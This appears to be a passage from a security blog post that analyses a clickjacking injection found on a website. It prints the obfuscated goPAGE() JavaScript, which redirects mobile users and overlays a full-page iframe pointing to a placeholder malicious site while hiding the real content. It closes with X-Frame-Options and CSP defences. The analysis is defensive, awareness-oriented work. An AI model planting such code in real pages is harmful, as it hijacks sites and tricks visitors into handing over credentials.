punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>http://123.123.123.123/script.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span> <span class=\"token comment\">&lt;!-- What is this? --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token comment\">&lt;!-- Content --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>Strange. A script tag referencing code that lives in some random IP address with HTTP connections. LGTM 👍.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">/* Some more Baidu Analytics code to track your activity */</span>\n<span class=\"token keyword\">var</span> _hmt <span class=\"token operator\">=</span> _hmt <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">var</span> hm <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"script\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  hm<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">\"https://hm.baidu.com/hm.js?12345\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByTagName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"script\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n  s<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span>hm<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">goPAGE</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>navigator<span class=\"token punctuation\">.</span>userAgent<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">\"http://www.maliciouspage.com\"</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> ss <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;center id=\"importantDiv\">&lt;ifr'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'ame scrolling=\"no\" marginheight=0 marginwidth=0  frameborder=\"0\" width=\"100%\" width=\"14'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'00\" height=\"108'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'88\" src=\"http://www.maliciouspage.com\">&lt;/iframe>&lt;/center>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"do\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"cu\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ment.wr\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ite('\"</span> <span class=\"token operator\">+</span> ss <span class=\"token operator\">+</span> <span class=\"token string\">\"');\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"div\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"All\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">\"no\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ne\"</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">var</span> tagname <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>tagName<span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">var</span> myid <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myid <span class=\"token operator\">!=</span> <span class=\"token string\">\"iconDiv1\"</span> <span class=\"token operator\">&amp;&amp;</span> myid <span class=\"token operator\">!=</span> <span class=\"token string\">\"importantDiv\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                            document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">\"non\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"e\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">goPAGE</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Notice how some of the JavaScript that is shown above is obfuscated to escape detection. The first portion of the code is just a classic analytics code sent to Baidu. The second part with the <code class=\"language-text\">goPAGE()</code> function is the meat of the exploit.</p>\n<p>It first checks if you are using a mobile device and redirects you directly to the website if you are.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>navigator<span class=\"token punctuation\">.</span>userAgent<span class=\"token punctuation\">.</span><span class=\"token function\">match</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token string\">\"http://www.maliciouspage.com\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Otherwise, the iframe is injected into the page directly by calling the <code class=\"language-text\">eval()</code> function. The code it evaluates is broken up in such a way to avoid any detection. However, it is quite easy to spot just by looking at it.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> ss <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;center id=\"importantDiv\">&lt;ifr'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'ame scrolling=\"no\" marginheight=0 marginwidth=0  frameborder=\"0\" width=\"100%\" width=\"14'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'00\" height=\"108'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'88\" src=\"http://www.maliciouspage.com\">&lt;/iframe>&lt;/center>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"do\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"cu\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ment.wr\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ite('\"</span> <span class=\"token operator\">+</span> ss <span class=\"token operator\">+</span> <span class=\"token string\">\"');\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>Finally, an interval function is executed to hide all elements except the iframe every 100ms.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n      document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"div\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"All\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">\"no\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"ne\"</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> tagname <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>tagName<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> myid <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>myid <span class=\"token operator\">!=</span> <span class=\"token string\">\"iconDiv1\"</span> <span class=\"token operator\">&amp;&amp;</span> myid <span class=\"token operator\">!=</span> <span class=\"token string\">\"importantDiv\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">\"non\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"e\"</span>\n        <span class=\"token punctuation\">}</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span></code></pre></div>\n<p>On the surface, this attack doesn't seem too complicated to understand. However, it can be used mislead users to hand over sensitive information in a legitimate-looking website. Also, this can be especially lethal when the website loaded in the iframe uses HTTP (which only works if the parent page is also HTTP).</p>\n<p>I created a quick <a href=\"https://codepen.io/spiderpig86/pen/JjGBbXQ\" target=\"_blank\" rel=\"noopener noreferrer\">example</a> on Codepen to demonstrate how it works. In this example, a \"malicious\" sign up page is presented to you after loading some websites requiring social media credentials.</p>\n<h2>Conclusion/Prevention</h2>\n<p>In short, Clickjacking is a commonly used tactic attackers use to mislead users into performing actions they are not aware of. Now, this attack doesn't use sophisticated tactics to break into some system, however, it is still quite effective along with other tactics that involve the human condition, such as phishing.</p>\n<p><img src=\"https://github.com/Spiderpig86/blog/blob/master/images/Clickjacking%20Using%20Iframes%20A%20Case%20Study/What_people_think_programming_is_vs._how_it_actually_is.gif?raw=true\" alt=\"Hackerman\"></p>\n<p>For any website maintainer, a couple of ways to defend against this attack is:</p>\n<ol>\n<li>Set the correct <code class=\"language-text\">X-Frame-Options</code> to disallow any access to your page from other domains. For a more up to date solution, use a Content Security Policy (CSP) to disallow any frame to load content from other domains of origin.</li>\n<li>Ensure that the main page itself is always the top-level frame.</li>\n</ol>\n<p>As for users, it is always important to remain vigilant for any dodgy offers of money, hot singles in your area, and ads for cheap treatments that doctors ABSOLUTELY hate.</p>\n<h2>References</h2>\n<ul>\n<li>Wikipedia contributors. \"Clickjacking.\" <em>Wikipedia, The Free Encyclopedia</em>. Wikipedia, The Free Encyclopedia, 21 Jun. 2020. Web. 12 Jul. 2020.</li>\n<li>“Clickjacking.” <em>OWASP</em>, owasp.org/www-community/attacks/Clickjacking.</li>\n<li>“The Clickjacking Attack.” <em>The Modern JavaScript Tutorial</em>, 29 June 2019, javascript.info/clickjacking.</li>\n</ul>","id":"15e19f40-9ccc-5c04-9c74-cd080e4a0c0d","fields":{"slug":"/posts/2020-07-12-clickjacking-using-iframes:-a-case-study/"},"frontmatter":{"date":"2020-07-12T16:18:32.278Z","path":"/clickjacking-using-iframes:-a-case-study","title":"Clickjacking Using Iframes: A Case Study","description":"Having been around since 2002, Clickjacking or 'UI redressing' is technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent.","tags":["security","clickjacking","attacks"]}}}}}}